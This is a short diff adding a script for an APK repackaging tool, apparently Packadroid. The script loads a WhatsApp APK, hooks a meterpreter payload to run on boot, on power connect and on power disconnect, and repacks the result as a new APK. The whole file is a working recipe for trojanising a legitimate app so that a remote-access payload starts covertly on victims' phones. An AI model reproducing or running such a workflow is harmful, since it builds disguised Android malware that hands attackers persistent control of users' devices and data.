@@ -1,0 +1,7 @@
+load_original /home/moe/Dokumente/Packadroid/Automated_Repackager/OriginalApk/Whatsapp.apk
+add_broadcast_hook on_power_connected meterpreter.apk Payload start
+add_broadcast_hook on_boot_completed meterpreter.apk Payload start
+add_broadcast_hook on_power_disconnected meterpreter.apk Payload2 start
+list_added_hooks
+repack repacked.apk
+exit -f
